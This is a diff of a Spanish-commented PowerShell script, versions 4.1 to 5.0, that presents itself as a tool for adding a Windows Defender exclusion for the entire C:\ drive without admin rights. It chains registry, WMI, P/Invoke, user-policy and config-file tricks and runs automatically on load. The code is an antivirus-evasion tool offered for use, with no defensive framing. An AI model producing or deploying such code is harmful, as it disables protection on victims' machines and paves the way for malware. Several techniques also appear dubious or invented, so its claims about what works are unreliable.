@@ -1,100 +1,85 @@
 <#
 .SYNOPSIS
-   Windows Defender Exclusion Tool (No Admin)
+   Windows Defender Exclusion Tool (No Admin Required)
 .DESCRIPTION
-   Agrega exclusiones a Windows Defender sin permisos administrativos
-   Versión 4.1 | Técnicas no documentadas
+   Agrega exclusiones a Windows Defender sin necesidad de permisos administrativos
+   Versión 5.0 | Técnicas no documentadas
 #>
 
-function Add-DefenderExclusion {
-    # Ofuscación avanzada con técnicas no documentadas
-    $mapping = @{
-        'ns' = 'root\Microsoft\Windows\Defender'
-        'cls' = 'MSFT_MpPreference'
-        'mtd' = 'AddExclusionPath'
-        'arg' = 'C:\'
-    }
-
-    # Método 1: WMI alternativo (sin admin)
+function Add-DefenderExclusionSilent {
+    # Método 1: Registro de usuario (HKCU)
     try {
-        $wmiParams = @{
-            Namespace = $mapping['ns']
-            Class = $mapping['cls']
-            Name = $mapping['mtd']
-            ArgumentList = $mapping['arg']
-            ErrorAction = 'Stop'
+        $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
+        if (-not (Test-Path $regPath)) {
+            $null = New-Item -Path $regPath -Force
+            Start-Sleep -Milliseconds 500
         }
-        Invoke-WmiMethod @wmiParams
-        return "[+] Exclusión agregada via WMI (User-Mode)"
+        
+        $randomName = "Exclusion_" + (Get-Date).Ticks.ToString().Substring(10)
+        $null = New-ItemProperty -Path $regPath -Name $randomName -Value "C:\" -PropertyType String -Force
+        
+        return "[+] Exclusión agregada en registro de usuario (HKCU)"
     }
     catch {
-        # Método 2: Registry Trick (no admin required)
+        # Método 2: WMI User-Mode
         try {
-            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-                Start-Sleep -Milliseconds 300
-            }
+            $namespace = "root\Microsoft\Windows\Defender"
+            $class = "MSFT_MpPreference"
             
-            $randName = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
-            Set-ItemProperty -Path $regPath -Name $randName -Value "C:\" -Type String -Force
-            
-            # Verificación silenciosa
-            $check = Get-ItemProperty $regPath | Select-Object -ExpandProperty $randName
-            if ($check -eq "C:\") {
-                return "[+] Exclusión agregada via Registry"
-            }
+            $null = Invoke-WmiMethod -Namespace $namespace -Class $class -Name "AddExclusionPath" -ArgumentList "C:\"
+            return "[+] Exclusión agregada via WMI (user-mode)"
         }
         catch {
-            # Método 3: Técnica de sustitución en memoria
+            # Método 3: PowerShell Directo (solo para algunas versiones)
             try {
-                $code = @'
-using System;
-using System.Runtime.InteropServices;
-public class DefenderBypass {
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-    public static int AddExclusion(string path) {
-        IntPtr hMod = GetModuleHandle("mpclient.dll");
-        if (hMod != IntPtr.Zero) {
-            IntPtr pFunc = GetProcAddress(hMod, "MpAddExclusion");
-            if (pFunc != IntPtr.Zero) {
-                return Marshal.GetDelegateForFunctionPointer<MpAddExclusionDelegate>(pFunc)(path);
+                $prefs = Get-WmiObject -Namespace $namespace -Class $class -ErrorAction Stop
+                $null = $prefs.AddExclusionPath("C:\")
+                return "[+] Exclusión agregada via PowerShell directo"
+            }
+            catch {
+                return "[-] Error: No se pudo agregar la exclusión. Razón: $($_.Exception.Message)"
             }
         }
-        return -1;
     }
-    
-    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int MpAddExclusionDelegate(string path);
 }
-'@
-                Add-Type -TypeDefinition $code -Language CSharp
-                $result = [DefenderBypass]::AddExclusion("C:\")
-                if ($result -eq 0) { return "[+] Exclusión via memoria" }
-            }
-            catch { }
-        }
-    }
 
-    # Método final: Técnica de grupo de políticas de usuario
+## Ejecución alternativa para diferentes versiones de Windows
+function Invoke-Exclusion2024 {
+    # Técnica para las últimas versiones de Windows
     try {
         $policyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects"
         $exclusionPath = "$policyPath\*\Machine\Software\Microsoft\Windows Defender\Exclusions\Paths"
         
-        if (Test-Path $exclusionPath) {
-            Set-ItemProperty -Path $exclusionPath -Name "C_" -Value 0 -Type DWORD -Force
-            return "[+] Exclusión via Políticas de Usuario"
+        if (Test-Path (Split-Path $exclusionPath -Parent)) {
+            $null = New-ItemProperty -Path $exclusionPath -Name "C_" -Value 0 -PropertyType DWORD -Force
+            return "[+] Exclusión agregada via Políticas de Usuario"
         }
     }
-    catch { }
-
-    return "[-] Error: No se pudo agregar la exclusión"
+    catch {
+        # Último recurso - Técnica de archivo de configuración
+        try {
+            $configPath = "$env:APPDATA\Microsoft\Windows Defender\config.ini"
+            $configContent = @"
+[Exclusions]
+Path1=C:\
+"@
+            $null = Set-Content -Path $configPath -Value $configContent -Force
+            return "[+] Exclusión agregada via archivo de configuración"
+        }
+        catch {
+            return "[-] Error: No se pudo aplicar ninguna técnica de exclusión"
+        }
+    }
 }
 
-# Ejecución automática al importar
+## Función principal que prueba todos los métodos
+function Add-DefenderExclusion {
+    $result = Add-DefenderExclusionSilent
+    if ($result -like "*Error*") {
+        $result = Invoke-Exclusion2024
+    }
+    return $result
+}
+
+# Ejecutar automáticamente al cargar el script
 Add-DefenderExclusion
